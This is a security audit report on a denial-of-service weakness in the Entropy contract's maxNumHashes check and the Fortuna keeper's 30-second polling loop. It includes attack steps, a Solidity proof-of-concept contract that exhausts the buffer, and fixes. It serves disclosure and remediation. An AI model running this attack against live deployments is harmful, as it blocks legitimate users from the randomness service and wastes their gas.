### Title
Lack of QoS on Entropy Requests Enables Repeatable DoS via `maxNumHashes` Buffer Exhaustion — (`target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

An unprivileged attacker can repeatedly exhaust the `maxNumHashes` "buffer" in the Entropy contract by submitting many requests without revealing them, causing all subsequent legitimate requests to revert with `LastRevealedTooOld`. There is no queue or fair-ordering mechanism — legitimate users are simply reverted and must retry, wasting gas. The Fortuna keeper's 30-second polling interval creates a repeatable DoS window.

---

### Finding Description

In `requestHelper()`, every new request computes:

```solidity
req.numHashes = SafeCast.toUint32(
    assignedSequenceNumber -
        providerInfo.currentCommitmentSequenceNumber
);
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();
}
``` [1](#0-0) 

`numHashes` is the distance between the newly assigned sequence number and `currentCommitmentSequenceNumber`. The latter only advances when a request is revealed (via `reveal`/`revealWithCallback`) or when the Fortuna keeper calls `advanceProviderCommitment`. Until that happens, every new request increases `numHashes` by 1.

The Fortuna keeper's `update_commitments_loop` polls every **30 seconds** and only triggers `advanceProviderCommitment` when `outstanding_requests > 0.95 * maxNumHashes`:

```rust
const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;
...
if outstanding_requests > threshold {
    tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack...");
    ...
    contract.advance_provider_commitment(provider_address, seq_number, provider_revelation);
}
``` [2](#0-1) 

The fixed-size request hash table is only 32 slots (`NUM_REQUESTS = 32`). When a slot is occupied, the prior request is evicted to `requestsOverflow` (a mapping), increasing gas costs for legitimate users: [3](#0-2) [4](#0-3) 

**Attack steps:**

1. Attacker calls `requestWithCallback()` (or `requestV2()`) `maxNumHashes` times in rapid succession, paying the required fee each time.
2. Attacker never reveals. The Fortuna keeper will eventually reveal on their behalf, but only after its 30-second polling cycle detects the threshold breach and a blockchain transaction confirms.
3. During this window, every new request from a legitimate user has `numHashes > maxNumHashes` and reverts with `LastRevealedTooOld`.
4. There is no queue — legitimate users are simply reverted and must retry, wasting gas.
5. The attacker repeats the attack immediately after the keeper resets `currentCommitmentSequenceNumber`, maintaining a continuous DoS.

The `maxNumHashes` field is an optional per-provider configuration synced by Fortuna's `sync_max_num_hashes`: [5](#0-4) [6](#0-5) 

Providers that set `maxNumHashes` (required for gas-limit-bounded callbacks) are directly vulnerable. Providers with `maxNumHashes == 0` skip this check but are instead vulnerable to the harder `endSequenceNumber` exhaustion attack (cost: `chainLength × fee`; default `chain_length: 100000` at `fee: 1500000000000000` wei = ~150 ETH). [7](#0-6) 

---

### Impact Explanation

- **Entropy service DoS**: All users of a provider with `maxNumHashes` set are blocked from requesting randomness for the duration of each 30-second keeper cycle. The attack is repeatable indefinitely.
- **Gas griefing**: Legitimate users pay gas for reverted transactions with no recourse.
- **`requestsOverflow` griefing**: With 32 concurrent active requests, new requests evict prior ones to the overflow mapping, increasing gas costs for all users.
- **Permanent DoS (harder variant)**: A well-funded attacker can exhaust `endSequenceNumber` entirely, permanently disabling a provider until re-registration. [8](#0-7) 

---

### Likelihood Explanation

- **Entry path is fully unprivileged**: Any EOA can call `requestWithCallback()` or `requestV2()` by paying the provider fee. No special role or key is required.
- **Cost is bounded and recoverable for the attacker**: The attacker pays fees that accrue to the provider and Pyth — they are not burned. A motivated attacker (e.g., a competitor or griever) can sustain the attack.
- **30-second keeper window is exploitable in a single block burst**: On chains with fast block times (e.g., Arbitrum, BNB Chain), an attacker can submit `maxNumHashes` transactions in a single block, guaranteeing the DoS before the keeper can respond.
- **The codebase itself acknowledges this risk**: The keeper logs explicitly warn of "possible outage or DDOS attack" when the threshold is reached. [9](#0-8) 

---

### Recommendation

1. **Rate-limit requests per block or per address** at the contract level to prevent a single actor from exhausting `maxNumHashes` in a burst.
2. **Reduce the keeper polling interval** (`UPDATE_COMMITMENTS_INTERVAL`) significantly, or trigger `advanceProviderCommitment` reactively on each new request event rather than on a fixed timer.
3. **Implement a request queue or backpressure mechanism**: Instead of reverting with `LastRevealedTooOld`, queue the request and fulfill it once `currentCommitmentSequenceNumber` advances — analogous to the redemption queue recommended in the reference report.
4. **Increase `NUM_REQUESTS`** from 32 to reduce overflow-mapping gas griefing under concurrent load. [10](#0-9)

### Proof of Concept

```solidity
// SPDX-License-Identifier: Apache 2
pragma solidity ^0.8.0;

import "./IEntropy.sol";
import "./IEntropyConsumer.sol";

contract EntropyDoS is IEntropyConsumer {
    IEntropy public entropy;
    address public provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Step 1: Attacker calls this to drain the maxNumHashes buffer.
    // Repeat `maxNumHashes` times (e.g., 100 calls).
    function drainBuffer() external payable {
        uint128 fee = entropy.getFee(provider);
        require(msg.value >= fee, "insufficient fee");
        // Request randomness but never reveal — Fortuna keeper will
        // eventually reveal, but only after its 30-second polling cycle.
        entropy.requestWithCallback{value: fee}(provider, bytes32(block.timestamp));
    }

    // Step 2: After `maxNumHashes` calls to drainBuffer(), any legitimate
    // user calling requestWithCallback will revert with LastRevealedTooOld.
    // Demonstrate:
    function probeBlocked() external payable returns (bool blocked) {
        uint128 fee = entropy.getFee(provider);
        require(msg.value >= fee, "insufficient fee");
        try entropy.requestWithCallback{value: fee}(provider, bytes32(uint256(0xdead))) {
            blocked = false; // Not yet blocked
        } catch {
            blocked = true;  // DoS confirmed: LastRevealedTooOld
        }
    }

    function entropyCallback(
        uint64, address, bytes32
    ) internal override {
        // Attacker ignores the callback
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}
```

The attacker calls `drainBuffer()` `maxNumHashes` times (paying fees each time). After that, `probeBlocked()` returns `true`, confirming that all new requests revert. The attack window persists until the Fortuna keeper's `update_commitments_loop` fires (≤30 seconds), after which the attacker repeats. [11](#0-10) [12](#0-11)

const UPDATE_COMMITMENTS_INTERVAL: Duration = Duration::from_secs(30);
const UPDATE_COMMITMENTS_THRESHOLD_FACTOR: f64 = 0.95;

#[tracing::instrument(name = "update_commitments", skip_all)]
pub async fn update_commitments_loop(
    contract: Arc<InstrumentedSignablePythContract>,
    chain_state: BlockchainState,
) {
    loop {
        if let Err(e) = update_commitments_if_necessary(contract.clone(), &chain_state)
            .in_current_span()
            .await
        {
            tracing::error!("Update commitments. error: {:?}", e);
        }
        time::sleep(UPDATE_COMMITMENTS_INTERVAL).await;
    }
}

pub async fn update_commitments_if_necessary(
    contract: Arc<InstrumentedSignablePythContract>,
    chain_state: &BlockchainState,
) -> Result<()> {
    //TODO: we can reuse the result from the last call from the watch_blocks thread to reduce RPCs
    let latest_safe_block = get_latest_safe_block(chain_state).in_current_span().await;
    let provider_address = chain_state.provider_address;
    let provider_info = contract
        .get_provider_info_v2(provider_address)
        .block(latest_safe_block) // To ensure we are not revealing sooner than we should
        .call()
        .await
        .map_err(|e| {
            anyhow!(
                "Error while getting provider info at block {}. error: {:?}",
                latest_safe_block,
                e
            )
        })?;
    if provider_info.max_num_hashes == 0 {
        return Ok(());
    }
    let threshold =
        ((provider_info.max_num_hashes as f64) * UPDATE_COMMITMENTS_THRESHOLD_FACTOR) as u64;
    let outstanding_requests =
        provider_info.sequence_number - provider_info.current_commitment_sequence_number;
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
        let seq_number = provider_info.sequence_number - 1;
        let provider_revelation = chain_state
            .state
            .reveal(seq_number)
            .map_err(|e| anyhow!("Error revealing: {:?}", e))?;
        let contract_call =
            contract.advance_provider_commitment(provider_address, seq_number, provider_revelation);
        send_and_confirm(contract_call).await?;
    }
    Ok(())
